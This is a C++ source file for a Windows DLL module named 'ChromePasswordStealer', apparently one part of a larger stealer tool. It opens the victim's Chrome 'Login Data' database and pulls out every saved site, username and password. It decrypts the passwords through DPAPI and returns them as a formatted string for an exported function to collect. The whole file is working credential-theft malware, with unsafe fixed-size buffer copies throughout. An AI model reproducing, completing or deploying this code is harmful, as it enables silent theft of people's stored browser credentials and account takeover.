// _s_Module_Browser_Info_ChromePasswordStealer.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "_s_Module_Browser_Info_ChromePasswordStealer.h"
using namespace std;
#include <xutility>
#include <string>
#include <vector>
#include <algorithm>
#include <cstdio>
#include <cstdlib>

#define NOMINMAX
#define _WIN32_IE 0x0500
#include <Shlobj.h>
#include <wincrypt.h>

#include "sqlite3.h"


#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "shell32.lib")
#pragma comment (lib, "comsuppw.lib")
#include "Public.h";



// decrypt any entries found in database
void list_entries(std::string login_db) {
	sqlite3 *db;
	std::string::size_type mx_realm, mx_name, mx_pw;
	info[0].it = false;

	mx_realm = mx_name = mx_pw = 15;

	// open database
	if (sqlite3_open(login_db.c_str(), &db) == SQLITE_OK) {
		sqlite3_stmt *stmt;
		std::string query = "SELECT username_value, password_value, signon_realm"
			" FROM logins";
		// execute SQL statement
		if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, 0) == SQLITE_OK) {
			for (int i = 0;sqlite3_step(stmt) == SQLITE_ROW;i++) {
				info[i + 1].it = false;
				DATA_BLOB in, out;
				std::string realm, name, passw;

				name = (char*)sqlite3_column_text(stmt, 0);
				realm = (char*)sqlite3_column_text(stmt, 2);

				in.pbData = (LPBYTE)sqlite3_column_blob(stmt, 1);
				in.cbData = sqlite3_column_bytes(stmt, 1);

				// decrypt using DPAPI
				if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 1, &out)) {
					passw = (char*)out.pbData;
					passw[out.cbData] = 0;

					LocalFree(out.pbData);
				}
				else {
					passw = "<decryption failed>";
				}
				mx_realm = std::max(realm.length(), mx_realm);
				mx_name = std::max(name.length(), mx_name);
				mx_pw = std::max(passw.length(), mx_pw);
				info[i].it = true;
				strcpy(info[i].url, realm.c_str());
				strcpy(info[i].uname, name.c_str());
				strcpy(info[i].upass, passw.c_str());
			}
			sqlite3_finalize(stmt);
		}
		else {
			printf("\n sqlite3_prepare_v2(\"%s\") : %s\n",
				login_db.c_str(), sqlite3_errmsg(db));
		}
		sqlite3_close(db);
	}
}

void exit_app(const char exit_msg[]) {
	//printf("%s\n Press any key to continue . . .", exit_msg);
	//fgetc(stdin);
	//exit(0);
}


BSTR ANSItoBSTR(const char* input)
{
	BSTR result = NULL;
	int lenA = lstrlenA(input);
	int lenW = ::MultiByteToWideChar(CP_ACP, 0, input, lenA, NULL, 0);
	if (lenW > 0)
	{
		result = ::SysAllocStringLen(0, lenW);
		::MultiByteToWideChar(CP_ACP, 0, input, lenA, result, lenW);
	}
	return result;
}

BSTR ConvertInfoToBstr()
{
	_bstr_t  RetValue = L"";
	_bstr_t  OneValue = L"";
	char  OneInfo[2048];
	for (int i = 0;;i++)
	{
		if (info[i].it)
		{

			sprintf(OneInfo, "Url=%s\r\nUserName=%s\r\nPassword=%s\r\n", info[i].url, info[i].uname, info[i].upass);
			OneValue = ANSItoBSTR(OneInfo);

			RetValue += OneValue;
			info[i].it = false;
		}
		else
		{
			break;
		}
	}
	return RetValue;
}

BSTR  GetChromePasswordFromDLL()
{
	info = new INFO[500];
	char * db_path = (char *)malloc(sizeof(char) * 2048);

	// if user doesn't provide filename, app will look in local profile
	CHAR lpszPath[MAX_PATH];

	if (!SHGetSpecialFolderPathA(NULL, lpszPath,
		CSIDL_LOCAL_APPDATA, FALSE)) {
		return 0;
		//exit_app("Unable to determine \"Local Settings\" folder");
	}
	// this path is probably different for older versions
	strcpy(db_path, lpszPath);
	strcat(db_path, "\\Google\\Chrome\\User Data\\Default\\Login Data");

	// ensure file exists
	if (GetFileAttributesA(db_path) == INVALID_FILE_ATTRIBUTES) {
		//printf(" Couldn't open \"%s\"", db_path);
	}
	else {
		list_entries(db_path);
	}
	return ConvertInfoToBstr();
}


